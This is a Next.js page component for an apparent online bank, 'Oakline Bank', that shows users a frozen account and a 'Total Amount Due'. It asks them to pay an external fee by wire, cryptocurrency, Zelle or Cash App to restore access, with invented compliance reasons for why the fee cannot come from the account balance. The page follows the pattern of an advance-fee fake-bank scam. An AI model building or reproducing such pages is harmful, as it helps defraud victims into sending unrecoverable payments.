import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import Link from 'next/link';
import { supabase } from '../../lib/supabaseClient';

const useMediaQuery = (query) => {
  const [matches, setMatches] = useState(false);
  useEffect(() => {
    const media = window.matchMedia(query);
    if (media.matches !== matches) setMatches(media.matches);
    const listener = () => setMatches(media.matches);
    media.addEventListener('change', listener);
    return () => media.removeEventListener('change', listener);
  }, [matches, query]);
  return matches;
};

export default function FreezePayment() {
  const router = useRouter();
  const isMobile = useMediaQuery('(max-width: 768px)');
  const { amount } = router.query;

  const [user, setUser] = useState(null);
  const [profile, setProfile] = useState(null);
  const [loading, setLoading] = useState(true);
  const [selectedMethod, setSelectedMethod] = useState('');
  const [frozenReason, setFrozenReason] = useState('');
  const [freezeAmount, setFreezeAmount] = useState(0);

  useEffect(() => {
    checkUserAndFetchData();
  }, []);

  useEffect(() => {
    if (amount) {
      setFreezeAmount(parseFloat(amount) || 0);
    }
  }, [amount]);

  const checkUserAndFetchData = async () => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session?.user) {
        router.push('/sign-in');
        return;
      }
      setUser(session.user);

      const { data: profileData } = await supabase
        .from('profiles')
        .select('is_frozen, frozen_reason, freeze_amount_required, full_name')
        .eq('id', session.user.id)
        .single();

      if (profileData) {
        setProfile(profileData);
        setFrozenReason(profileData.frozen_reason || '');
        if (!amount && profileData.freeze_amount_required) {
          setFreezeAmount(parseFloat(profileData.freeze_amount_required) || 0);
        }
      }
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  const formatCurrency = (amount) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD'
    }).format(amount || 0);
  };

  const paymentMethods = [
    { id: 'wire', name: 'Wire Transfer', icon: '🏦', description: 'Direct bank transfer (1-2 business days)' },
    { id: 'crypto', name: 'Cryptocurrency', icon: '₿', description: 'Bitcoin, Ethereum, USDT, and more' },
    { id: 'zelle', name: 'Zelle', icon: '💸', description: 'Instant transfer using Zelle' },
    { id: 'cashapp', name: 'Cash App', icon: '💵', description: 'Pay via Cash App' }
  ];

  if (loading) {
    return (
      <div style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #1a365d 0%, #059669 100%)'
      }}>
        <div style={{
          width: '40px',
          height: '40px',
          border: '3px solid rgba(255,255,255,0.3)',
          borderTop: '3px solid white',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite'
        }} />
        <style jsx>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
      </div>
    );
  }

  return (
    <>
      <Head>
        <title>Account Freeze Resolution - Oakline Bank</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #1a365d 0%, #059669 100%)'
      }}>
        {/* Header */}
        <header style={{
          maxWidth: '1200px',
          margin: '0 auto',
          padding: isMobile ? '1rem' : '1.5rem 2rem',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center'
        }}>
          <Link href="/" style={{
            display: 'flex',
            alignItems: 'center',
            gap: '0.75rem',
            textDecoration: 'none'
          }}>
            <img 
              src="/images/Oakline_Bank_logo_design_c1b04ae0.png" 
              alt="Oakline Bank" 
              style={{ height: isMobile ? '36px' : '44px' }}
            />
            <div>
              <h1 style={{
                fontSize: isMobile ? '1.125rem' : '1.375rem',
                fontWeight: '700',
                color: '#ffffff',
                margin: 0
              }}>Oakline Bank</h1>
              <span style={{
                fontSize: '0.75rem',
                color: 'rgba(255,255,255,0.8)'
              }}>Your Financial Partner</span>
            </div>
          </Link>
          <Link href="/dashboard" style={{
            padding: '0.6rem 1.2rem',
            backgroundColor: 'rgba(255,255,255,0.15)',
            color: 'white',
            textDecoration: 'none',
            borderRadius: '8px',
            fontSize: '0.9rem',
            border: '1px solid rgba(255,255,255,0.25)'
          }}>
            Back to Dashboard
          </Link>
        </header>

        {/* Main Content */}
        <main style={{
          maxWidth: '900px',
          margin: '0 auto',
          padding: isMobile ? '1rem' : '2rem'
        }}>
          {/* Title Section */}
          <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
            <h1 style={{
              fontSize: isMobile ? '1.75rem' : '2.25rem',
              fontWeight: '700',
              color: '#ffffff',
              marginBottom: '0.75rem'
            }}>
              Account Freeze Resolution
            </h1>
            <p style={{
              fontSize: isMobile ? '0.95rem' : '1.0625rem',
              color: 'rgba(255,255,255,0.9)',
              maxWidth: '600px',
              margin: '0 auto',
              lineHeight: '1.6'
            }}>
              Complete your payment to restore full access to your account and resume all banking services.
            </p>
          </div>

          {/* Payment Card */}
          <div style={{
            backgroundColor: '#ffffff',
            borderRadius: '20px',
            boxShadow: '0 20px 60px rgba(0, 0, 0, 0.2)',
            overflow: 'hidden'
          }}>
            {/* Amount Section */}
            <div style={{
              background: 'linear-gradient(135deg, #1a365d 0%, #2d4a7c 100%)',
              padding: isMobile ? '1.5rem' : '2rem',
              textAlign: 'center'
            }}>
              <p style={{
                fontSize: '0.875rem',
                color: 'rgba(255,255,255,0.8)',
                margin: '0 0 0.5rem 0',
                textTransform: 'uppercase',
                letterSpacing: '0.1em'
              }}>
                Total Amount Due
              </p>
              <p style={{
                fontSize: isMobile ? '2.5rem' : '3rem',
                fontWeight: '700',
                color: '#ffffff',
                margin: 0
              }}>
                {formatCurrency(freezeAmount)}
              </p>
            </div>

            {/* Info Section */}
            <div style={{
              padding: isMobile ? '1.5rem' : '2rem',
              borderBottom: '1px solid #e5e7eb'
            }}>
              {/* Reason Card */}
              <div style={{
                backgroundColor: '#fef2f2',
                border: '1px solid #fecaca',
                borderRadius: '12px',
                padding: '1rem 1.25rem',
                marginBottom: '1.5rem'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '0.75rem'
                }}>
                  <span style={{ fontSize: '1.25rem' }}>❄️</span>
                  <div>
                    <p style={{
                      fontSize: '0.8rem',
                      color: '#991b1b',
                      margin: '0 0 0.25rem 0',
                      fontWeight: '600',
                      textTransform: 'uppercase',
                      letterSpacing: '0.05em'
                    }}>
                      Freeze Reason
                    </p>
                    <p style={{
                      fontSize: '0.95rem',
                      color: '#7f1d1d',
                      margin: 0,
                      lineHeight: '1.5'
                    }}>
                      {frozenReason || 'Account freeze due to pending compliance review'}
                    </p>
                  </div>
                </div>
              </div>

              {/* Why External Payment */}
              <div style={{
                backgroundColor: '#f8fafc',
                borderRadius: '12px',
                padding: '1.25rem',
                marginBottom: '1.5rem'
              }}>
                <h3 style={{
                  fontSize: '1rem',
                  fontWeight: '600',
                  color: '#1a365d',
                  margin: '0 0 0.75rem 0'
                }}>
                  Why an External Payment is Required
                </h3>
                <ul style={{
                  margin: 0,
                  padding: '0 0 0 1.25rem',
                  color: '#475569',
                  fontSize: '0.875rem',
                  lineHeight: '1.8'
                }}>
                  <li>Due to regulatory compliance and fraud prevention protocols, we cannot deduct funds from frozen account balances</li>
                  <li>An external deposit verifies account ownership and ensures proper audit trails</li>
                  <li>This process protects both you and the bank from unauthorized transactions</li>
                  <li>Once payment is confirmed, all account restrictions will be lifted within 24-48 hours</li>
                </ul>
              </div>

              {/* Current Status */}
              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
                gap: '1rem'
              }}>
                <div style={{
                  backgroundColor: '#fef3c7',
                  borderRadius: '10px',
                  padding: '1rem',
                  textAlign: 'center'
                }}>
                  <p style={{
                    fontSize: '0.75rem',
                    color: '#92400e',
                    margin: '0 0 0.25rem 0',
                    fontWeight: '600',
                    textTransform: 'uppercase'
                  }}>
                    Wire Transfers
                  </p>
                  <p style={{
                    fontSize: '0.95rem',
                    color: '#b45309',
                    margin: 0,
                    fontWeight: '600'
                  }}>
                    Suspended
                  </p>
                </div>
                <div style={{
                  backgroundColor: '#fef3c7',
                  borderRadius: '10px',
                  padding: '1rem',
                  textAlign: 'center'
                }}>
                  <p style={{
                    fontSize: '0.75rem',
                    color: '#92400e',
                    margin: '0 0 0.25rem 0',
                    fontWeight: '600',
                    textTransform: 'uppercase'
                  }}>
                    Pending Transactions
                  </p>
                  <p style={{
                    fontSize: '0.95rem',
                    color: '#b45309',
                    margin: 0,
                    fontWeight: '600'
                  }}>
                    On Hold
                  </p>
                </div>
              </div>
            </div>

            {/* Payment Methods Section */}
            <div style={{
              padding: isMobile ? '1.5rem' : '2rem'
            }}>
              <h3 style={{
                fontSize: '1.125rem',
                fontWeight: '600',
                color: '#1a365d',
                margin: '0 0 1rem 0'
              }}>
                Select Payment Method
              </h3>

              <div style={{
                display: 'grid',
                gridTemplateColumns: isMobile ? '1fr' : 'repeat(2, 1fr)',
                gap: '0.75rem',
                marginBottom: '1.5rem'
              }}>
                {paymentMethods.map((method) => (
                  <button
                    key={method.id}
                    onClick={() => setSelectedMethod(method.id)}
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '0.75rem',
                      padding: '1rem',
                      backgroundColor: selectedMethod === method.id ? '#ecfdf5' : '#ffffff',
                      border: selectedMethod === method.id ? '2px solid #059669' : '1px solid #e5e7eb',
                      borderRadius: '12px',
                      cursor: 'pointer',
                      textAlign: 'left',
                      transition: 'all 0.2s ease'
                    }}
                  >
                    <span style={{
                      fontSize: '1.5rem',
                      width: '40px',
                      height: '40px',
                      backgroundColor: selectedMethod === method.id ? '#d1fae5' : '#f1f5f9',
                      borderRadius: '10px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center'
                    }}>
                      {method.icon}
                    </span>
                    <div>
                      <p style={{
                        fontSize: '0.95rem',
                        fontWeight: '600',
                        color: '#1a365d',
                        margin: '0 0 0.125rem 0'
                      }}>
                        {method.name}
                      </p>
                      <p style={{
                        fontSize: '0.75rem',
                        color: '#64748b',
                        margin: 0
                      }}>
                        {method.description}
                      </p>
                    </div>
                    {selectedMethod === method.id && (
                      <span style={{
                        marginLeft: 'auto',
                        color: '#059669',
                        fontSize: '1.25rem'
                      }}>
                        ✓
                      </span>
                    )}
                  </button>
                ))}
              </div>

              {/* Continue Button */}
              <button
                onClick={() => {
                  if (selectedMethod) {
                    router.push(`/freeze-payment/${selectedMethod}?amount=${freezeAmount}`);
                  }
                }}
                disabled={!selectedMethod}
                style={{
                  width: '100%',
                  padding: '1rem',
                  backgroundColor: selectedMethod ? '#059669' : '#cbd5e1',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '12px',
                  fontSize: '1rem',
                  fontWeight: '600',
                  cursor: selectedMethod ? 'pointer' : 'not-allowed',
                  transition: 'background-color 0.2s ease'
                }}
              >
                {selectedMethod ? `Continue with ${paymentMethods.find(m => m.id === selectedMethod)?.name}` : 'Select a Payment Method'}
              </button>

              {/* Help Text */}
              <p style={{
                fontSize: '0.8rem',
                color: '#94a3b8',
                textAlign: 'center',
                margin: '1.5rem 0 0 0',
                lineHeight: '1.6'
              }}>
                Need assistance? Contact our support team at{' '}
                <a href="mailto:support@theoaklinebank.com" style={{ color: '#1a365d', fontWeight: '500' }}>
                  support@theoaklinebank.com
                </a>
                {' '}or call <a href="tel:+16366356122" style={{ color: '#1a365d', fontWeight: '500' }}>+1 (636) 635-6122</a>
              </p>
            </div>
          </div>

          {/* Security Note */}
          <div style={{
            marginTop: '1.5rem',
            padding: '1rem 1.5rem',
            backgroundColor: 'rgba(255,255,255,0.1)',
            borderRadius: '12px',
            border: '1px solid rgba(255,255,255,0.2)',
            display: 'flex',
            alignItems: 'center',
            gap: '0.75rem'
          }}>
            <span style={{ fontSize: '1.25rem' }}>🔒</span>
            <p style={{
              fontSize: '0.875rem',
              color: 'rgba(255,255,255,0.9)',
              margin: 0,
              lineHeight: '1.5'
            }}>
              All transactions are secured with bank-level encryption and monitored for fraud protection.
            </p>
          </div>
        </main>
      </div>
    </>
  );
}
